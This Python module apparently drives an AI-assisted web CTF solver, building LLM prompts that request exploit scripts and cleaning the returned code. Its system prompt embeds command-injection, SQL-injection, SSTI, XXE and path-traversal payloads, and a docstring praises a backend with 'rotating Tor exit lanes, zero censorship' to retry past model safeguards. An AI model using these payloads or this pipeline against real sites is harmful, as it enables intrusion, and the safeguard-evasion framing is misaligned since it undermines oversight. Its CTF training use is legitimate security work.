import os
import re
import json
import time
import subprocess
import requests
from pathlib import Path
from typing import Optional, Dict, Any, Tuple, List

from .config import (
    DEFAULT_OPENCODE_HOST,
    DEFAULT_OPENCODE_MODEL,
    DEFAULT_OPENCODE_USER,
    OPENCODE_CONFIG_DIR,
    DEFAULT_OLLAMA_HOST,
    DEFAULT_MODEL,
    AI_GENERATION_TIMEOUT
)

class BaseCTFAIAgent:
    """Base class providing prompt construction and Python code sanitization."""

    def _build_prompts(
        self,
        challenge_name: str,
        target_url: str,
        fingerprint_data: Dict[str, Any],
        source_code_context: str,
        flag_pattern_str: str,
        previous_error: Optional[str] = None,
        experience_context: Optional[str] = None,
        scenario_info: Optional[Dict[str, Any]] = None,
        credentials: Optional[Dict[str, str]] = None
    ) -> Tuple[str, str]:
        system_prompt = (
            "You are an elite CTF player and automated security researcher specializing in Web exploitation.\n"
            "Your task is to analyze the given Web CTF challenge (source code, sinks, Docker environment) "
            "and write an autonomous, production-quality Python exploit script using `requests`.\n\n"
            "Strict Guidelines:\n"
            "1. First provide a concise 2-3 sentence strategic analysis explaining your reasoning and attack hypothesis.\n"
            "2. Output a complete, robust Python exploit script inside a single ```python ... ``` block.\n"
            "   Always start the script with required imports: `import sys`, `import requests`, `import re`.\n"
            "3. Evidence-driven exploitation: first identify the real route, method, authentication flow, and input shape from source/recon. "
            "For a confirmed sink, use a small list of 3-8 relevant payload variants; do not spray unrelated SQLi/SSTI/XXE/RCE payloads.\n"
            "4. Always use `import re` and `re.search(pattern, response.text)` or `re.findall(pattern, response.text)`.\n"
            "5. Use `requests.get(url, params={'param': payload})` or `requests.post(url, data={'param': payload})`.\n"
            "6. Common CTF Patterns to include in your candidate list:\n"
            "   - Command Injection (CRITICAL: Always wrap each payload in DOUBLE QUOTES `\"...\"` so single quotes inside payloads do not break Python syntax):\n"
            "     Example Python list:\n"
            "     ```python\n"
            "     payloads = [\n"
            "         \"'; cat /flag #\",\n"
            "         \"'; cat /flag.txt #\",\n"
            "         \"' || cat /flag || '\",\n"
            "         \"'; cat /flag || '\",\n"
            "         \"'%H'; cat /flag #\",\n"
            "         \"' $(cat /flag) '\",\n"
            "         \"'; cat /flag\",\n"
            "         \"; cat /flag\",\n"
            "         \"$(cat /flag)\"\n"
            "     ]\n"
            "     ```\n"
            "     * Flag file locations to test: `/flag`, `/flag.txt`, `flag.txt`, `flag`, `/var/www/flag.txt`\n"
            "   - SQLi Login Bypass: `admin' --`, `' OR 1=1 --`, `' OR '1'='1' --`, `' OR 1=1 #`, `admin' /*`, `' OR '1'='1`.\n"
            "   - SSTI: `{{ config['FLAG'] }}`, `{{ config.FLAG }}`, `{{ cycler.__init__.__globals__.os.popen('cat flag* || type flag.txt').read() }}`.\n"
            "   - XXE (XML External Entity): When XML is accepted (e.g. POST application/xml, /api/update, /rom):\n"
            "     * Request Format: ALWAYS send raw XML string in request body: `requests.post(url, headers={'Content-Type': 'application/xml'}, data=payload)`\n"
            "     * DO NOT wrap in a dict like `data={'param': payload}` for XML APIs! Send `data=payload` directly.\n"
            "     * DO NOT HTML-escape `<` or `>`, write raw XML characters.\n"
            "     * Omit `<?xml ... ?>` declaration and never prepend `&xxe;` before DOCTYPE.\n"
            "     Example Python list:\n"
            "     ```python\n"
            "     payloads = [\n"
            "         \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n"
            "<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>\"\"\",\n"
            "         \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n"
            "<FirmwareUpdateConfig><Firmware><Version>&xxe;</Version></Firmware></FirmwareUpdateConfig>\"\"\",\n"
            "         \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n"
            "<Root><Tag>&xxe;</Tag></Root>\"\"\",\n"
            "         \"\"\"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///flag\"> ]>\n"
            "<Root><Tag>&xxe;</Tag></Root>\"\"\"\n"
            "     ]\n"
            "     ```\n"
            "   - LFI / Path Traversal: `../../../../flag.txt`, `../../../../flag`, `php://filter/convert.base64-encode/resource=flag.txt`.\n"
            f"7. Target Flag Format: `{flag_pattern_str}`. When found, print it to stdout.\n"
            f"8. Target URL resolution: Use `target_url = sys.argv[1] if len(sys.argv) > 1 else '{target_url}'`.\n"
            "   IMPORTANT: Use the exact discovered route and HTTP method; do not invent a generic `/api` command endpoint.\n"
            "9. Feedback & Debugging: If a request fails or returns an error, always print: `print(f'HTTP {response.status_code}: {response.text[:250]}')`.\n"
            "10. Do NOT use interactive input() loops.\n"
            "11. If credentials are supplied, use one `requests.Session`, authenticate first, and reuse its cookies for protected endpoints.\n"
            "12. Prefer evidence from source/recon over broad random payload spraying."
        )

        user_content = f"### Challenge: {challenge_name}\n"
        user_content += f"### Target URL: {target_url}\n\n"

        if scenario_info:
            user_content += "### CTF Scenario & Clues:\n"
            if scenario_info.get("name"):
                user_content += f"Scenario Name: {scenario_info['name']}\n"
            if scenario_info.get("flag_location"):
                user_content += f"Flag Location Hint: {scenario_info['flag_location']}\n"
            if scenario_info.get("description"):
                user_content += f"Description / Lore:\n{scenario_info['description']}\n\n"

        if credentials:
            user_content += "### Challenge Credentials (authorized target only):\n"
            for key, value in credentials.items():
                user_content += f"{key}: {value}\n"
            user_content += "\n"

        user_content += f"### Static Analysis & Fingerprinting:\n{fingerprint_data.get('summary_for_ai', '')}\n\n"

        if source_code_context:
            user_content += f"### Source Code Context:\n{source_code_context}\n\n"

        if experience_context:
            user_content += f"{experience_context}\n\n"

        if previous_error:
            user_content += (
                f"### PREVIOUS EXPLOIT EXECUTION FAILED:\n"
                f"Error details:\n```\n{previous_error}\n```\n"
                f"Please analyze the failure above (e.g. 403 WAF, 500 error, syntax error, wrong path) and generate a corrected exploit script.\n"
            )

        return system_prompt, user_content

    def _sanitize_and_fix_code(self, code: str) -> str:
        """Fixes common LLM Python code generation issues like missing imports and undefined match checks."""
        needed_imports = []
        if ("sys." in code or "sys[" in code) and not re.search(r"\bimport\s+sys\b", code):
            needed_imports.append("import sys")
        if "re." in code and not re.search(r"\bimport\s+re\b", code):
            needed_imports.append("import re")
        if "requests." in code and not re.search(r"\bimport\s+requests\b", code):
            needed_imports.append("import requests")
        if "json." in code and not re.search(r"\bimport\s+json\b", code):
            needed_imports.append("import json")
        if "os." in code and not re.search(r"\bimport\s+os\b", code):
            needed_imports.append("import os")

        if needed_imports:
            code = "\n".join(needed_imports) + "\n" + code

        if re.search(r"\bif\s+(?:not\s+)?match\b", code) and not re.search(r"^\s*match\s*=", code, re.MULTILINE):
            code = "match = None\n" + code

        if "&lt;!DOCTYPE" in code or "&lt;!ENTITY" in code:
            code = code.replace("&lt;", "<").replace("&gt;", ">")
        code = re.sub(r"&xxe;(?=<\?xml|<!DOCTYPE)", "", code)
        code = re.sub(r'<\?xml[^>]*\?>\s*(?=<!DOCTYPE)', "", code)

        return code

    def _extract_code(self, response_text: str) -> str:
        """Extracts python code block from Markdown response and auto-fixes common syntax/import defects."""
        matches = re.findall(r"```python\s*([\s\S]*?)\s*```", response_text, re.IGNORECASE)
        code = ""
        if matches:
            code = max(matches, key=len).strip()
        else:
            generic_matches = re.findall(r"```\s*([\s\S]*?)\s*```", response_text)
            if generic_matches:
                code = max(generic_matches, key=len).strip()

        if code:
            code = self._sanitize_and_fix_code(code)

        return code


class OpenCodeAIAgent(BaseCTFAIAgent):
    """
    AI Agent using OpenCode service backed by lingling (unlimited tokens, rotating Tor exit lanes, zero censorship).
    """

    def __init__(
        self,
        model_name: Optional[str] = None,
        host: Optional[str] = None,
        username: str = DEFAULT_OPENCODE_USER,
        password: Optional[str] = None,
        timeout: int = AI_GENERATION_TIMEOUT
    ):
        raw_model = (model_name or DEFAULT_OPENCODE_MODEL).strip()
        mn_lower = raw_model.lower()
        if "deepseek" in mn_lower:
            self.model_name = "deepseek-v4.1-flash-free"
        elif "pickle" in mn_lower:
            self.model_name = "big-pickle"
        elif "glm" in mn_lower:
            self.model_name = "glm-5.3-flash-free"
        elif "nemotron" in mn_lower:
            self.model_name = "nemotron-3.5-super-vl-free"
        elif "mimo" in mn_lower:
            self.model_name = "mimo-v2.6-flash-free"
        else:
            self.model_name = raw_model

        self.username = username
        self.timeout = timeout

        # Resolve host
        if host:
            self.host = host.rstrip("/")
        elif os.getenv("OPENCODE_SERVICE_HOST"):
            self.host = os.getenv("OPENCODE_SERVICE_HOST").rstrip("/")
        else:
            self.host = self._discover_host()

        # Resolve password
        if password:
            self.password = password
        elif os.getenv("OPENCODE_SERVICE_PASSWORD"):
            self.password = os.getenv("OPENCODE_SERVICE_PASSWORD")
        else:
            self.password = self._read_password()

    def _discover_host(self) -> str:
        """Attempts to query 'opencode service status' to discover dynamic port, fallback to default."""
        try:
            out = subprocess.check_output(
                ["opencode", "service", "status"],
                text=True,
                stderr=subprocess.DEVNULL,
                timeout=2
            ).strip()
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("http://") or line.startswith("https://"):
                    return line.rstrip("/")
        except Exception:
            pass
        return DEFAULT_OPENCODE_HOST.rstrip("/")

    def _read_password(self) -> str:
        """Reads service authentication password from ~/.config/opencode/service.json."""
        try:
            svc_file = OPENCODE_CONFIG_DIR / "service.json"
            if svc_file.exists():
                data = json.loads(svc_file.read_text(encoding="utf-8"))
                return data.get("password", "")
        except Exception:
            pass
        return ""

    @property
    def auth(self):
        if self.password:
            return requests.auth.HTTPBasicAuth(self.username, self.password)
        return None

    def is_available(self) -> bool:
        """Checks if OpenCode service is running and credentials authenticate successfully."""
        try:
            r = requests.get(f"{self.host}/openapi.json", auth=self.auth, timeout=3)
            return r.status_code == 200
        except Exception:
            return False

    def list_models(self) -> List[str]:
        try:
            r = requests.get(f"{self.host}/api/model", auth=self.auth, timeout=5)
            if r.status_code == 200:
                data = r.json()
                return [m.get("id") for m in data.get("data", []) if m.get("id")]
        except Exception:
            pass
        return []

    def _delete_session(self, sid: str):
        try:
            requests.delete(f"{self.host}/api/session/{sid}", auth=self.auth, timeout=5)
        except Exception:
            pass

    def generate_exploit(
        self,
        challenge_name: str,
        target_url: str,
        fingerprint_data: Dict[str, Any],
        source_code_context: str,
        flag_pattern_str: str,
        previous_error: Optional[str] = None,
        experience_context: Optional[str] = None,
        scenario_info: Optional[Dict[str, Any]] = None,
        credentials: Optional[Dict[str, str]] = None
    ) -> Dict[str, str]:
        """
        Creates an OpenCode session, delivers prompt, polls for assistant response,
        and extracts Python exploit script. Auto-retries across Tor exit lanes if a gate occurs.
        """
        system_prompt, user_content = self._build_prompts(
            challenge_name=challenge_name,
            target_url=target_url,
            fingerprint_data=fingerprint_data,
            source_code_context=source_code_context,
            flag_pattern_str=flag_pattern_str,
            previous_error=previous_error,
            experience_context=experience_context,
            scenario_info=scenario_info,
            credentials=credentials
        )

        full_prompt = f"{system_prompt}\n\n{user_content}"
        max_retries = 3
        last_error = ""

        for attempt in range(1, max_retries + 1):
            sid = None
            try:
                # 1. Create OpenCode Session
                session_body: Dict[str, Any] = {"title": f"CTF - {challenge_name[:30]}"}
                if self.model_name:
                    session_body["model"] = {"id": self.model_name, "providerID": "opencode"}

                s_resp = requests.post(
                    f"{self.host}/api/session",
                    auth=self.auth,
                    json=session_body,
                    timeout=10
                )
                if s_resp.status_code not in (200, 201):
                    last_error = f"Failed to create session: HTTP {s_resp.status_code} - {s_resp.text}"
                    time.sleep(1)
                    continue

                sid = s_resp.json().get("data", {}).get("id")
                if not sid:
                    last_error = "Session ID missing from OpenCode response"
                    time.sleep(1)
                    continue

                # 2. Submit prompt to session
                p_resp = requests.post(
                    f"{self.host}/api/session/{sid}/prompt",
                    auth=self.auth,
                    json={"text": full_prompt},
                    timeout=15
                )
                if p_resp.status_code not in (200, 201):
                    last_error = f"Failed to post prompt: HTTP {p_resp.status_code} - {p_resp.text}"
                    self._delete_session(sid)
                    time.sleep(1)
                    continue

                # 3. Poll for completion
                start_time = time.time()
                while time.time() - start_time < self.timeout:
                    time.sleep(2)
                    m_resp = requests.get(
                        f"{self.host}/api/session/{sid}/message",
                        auth=self.auth,
                        timeout=10
                    )
                    if m_resp.status_code != 200:
                        continue

                    msgs = m_resp.json().get("data", [])
                    assistant_msg = next((m for m in msgs if m.get("type") == "assistant"), None)
                    if not assistant_msg:
                        continue

                    finish = assistant_msg.get("finish")
                    if finish == "stop":
                        content_blocks = assistant_msg.get("content", [])
                        reasoning_texts = []
                        response_texts = []
                        for b in content_blocks:
                            b_type = b.get("type")
                            b_text = b.get("text", "")
                            if b_type == "reasoning":
                                reasoning_texts.append(b_text)
                            elif b_type == "text":
                                response_texts.append(b_text)

                        full_reasoning = "\n".join(reasoning_texts)
                        full_response = "\n".join(response_texts)

                        exploit_code = self._extract_code(full_response)
                        if not exploit_code and full_reasoning:
                            exploit_code = self._extract_code(full_reasoning)

                        self._delete_session(sid)
                        return {
                            "reasoning": full_reasoning or full_response,
                            "exploit_code": exploit_code
                        }

                    elif finish == "error":
                        err_info = assistant_msg.get("error", {})
                        last_error = f"OpenCode Generation Error: {err_info.get('message', str(err_info))}"
                        self._delete_session(sid)
                        sid = None
                        break

                if sid:
                    self._delete_session(sid)
                    sid = None

            except Exception as e:
                last_error = str(e)
                if sid:
                    self._delete_session(sid)

        return {
            "reasoning": f"OpenCode failed after {max_retries} attempts. Last error: {last_error}",
            "exploit_code": ""
        }


class OllamaAIAgent(BaseCTFAIAgent):
    """AI Agent using local Ollama service."""

    def __init__(self, model_name: str = DEFAULT_MODEL, host: str = DEFAULT_OLLAMA_HOST):
        self.model_name = model_name
        self.host = host.rstrip("/")

    def is_available(self) -> bool:
        """Checks if the Ollama service is reachable and responsive."""
        try:
            r = requests.get(f"{self.host}/api/tags", timeout=3)
            return r.status_code == 200
        except Exception:
            return False

    def list_models(self) -> List[str]:
        try:
            r = requests.get(f"{self.host}/api/tags", timeout=3)
            if r.status_code == 200:
                data = r.json()
                return [m["name"] for m in data.get("models", [])]
        except Exception:
            pass
        return []

    def generate_exploit(
        self,
        challenge_name: str,
        target_url: str,
        fingerprint_data: Dict[str, Any],
        source_code_context: str,
        flag_pattern_str: str,
        previous_error: Optional[str] = None,
        experience_context: Optional[str] = None,
        scenario_info: Optional[Dict[str, Any]] = None,
        credentials: Optional[Dict[str, str]] = None
    ) -> Dict[str, str]:
        system_prompt, user_content = self._build_prompts(
            challenge_name=challenge_name,
            target_url=target_url,
            fingerprint_data=fingerprint_data,
            source_code_context=source_code_context,
            flag_pattern_str=flag_pattern_str,
            previous_error=previous_error,
            experience_context=experience_context,
            scenario_info=scenario_info,
            credentials=credentials
        )

        payload = {
            "model": self.model_name,
            "prompt": f"{system_prompt}\n\n{user_content}",
            "stream": False,
            "options": {
                "temperature": 0.2,
                "num_ctx": 16384
            }
        }

        try:
            resp = requests.post(
                f"{self.host}/api/generate",
                json=payload,
                timeout=AI_GENERATION_TIMEOUT
            )
            if resp.status_code != 200:
                return {
                    "reasoning": f"Ollama API Error: HTTP {resp.status_code} - {resp.text}",
                    "exploit_code": ""
                }

            raw_response = resp.json().get("response", "")
            exploit_code = self._extract_code(raw_response)

            return {
                "reasoning": raw_response,
                "exploit_code": exploit_code
            }

        except Exception as e:
            return {
                "reasoning": f"Exception connecting to Ollama: {str(e)}",
                "exploit_code": ""
            }


def create_ai_agent(provider: Optional[str] = None, model_name: Optional[str] = None) -> BaseCTFAIAgent:
    """
    Factory function to initialize the preferred CTF AI Agent.
    Priority: OpenCode (with lingling) -> Ollama -> OpenCode default fallback.
    """
    target_provider = provider or os.getenv("CTF_AI_PROVIDER")

    if target_provider == "ollama":
        return OllamaAIAgent(model_name=model_name or DEFAULT_MODEL)
    elif target_provider == "opencode":
        return OpenCodeAIAgent(model_name=model_name or DEFAULT_OPENCODE_MODEL)

    # Auto-detection: prefer OpenCode if running
    opencode_agent = OpenCodeAIAgent(model_name=model_name or DEFAULT_OPENCODE_MODEL)
    if opencode_agent.is_available():
        return opencode_agent

    ollama_agent = OllamaAIAgent(model_name=model_name or DEFAULT_MODEL)
    if ollama_agent.is_available():
        return ollama_agent

    return opencode_agent
